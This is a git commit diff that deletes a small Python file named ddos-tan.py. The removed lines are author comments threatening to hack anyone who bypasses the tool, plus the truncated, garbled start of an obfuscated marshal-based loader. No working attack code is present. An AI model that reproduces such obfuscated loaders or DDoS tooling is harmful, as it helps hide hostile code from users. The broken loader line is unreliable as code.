53132b18229297b7ccd236f4a54341101156d9e4
Tan-vai <135997970+Tan-vai@users.noreply.github.com>
2023-08-14 21:00:06 +0600

    Delete ddos-tan.py

--- ddos-tan.py
+++
@@ -1,6 +0,0 @@
-#Creator Tan vai
-#dont bypass it cause i fixed red virus this script
-#you bypass this tool i hacked your device
-# https://github.com/Tan-vai
-# Time : Thu Aug 10 17:36:00 2023
-_ = lambd__import__('marshal').loads
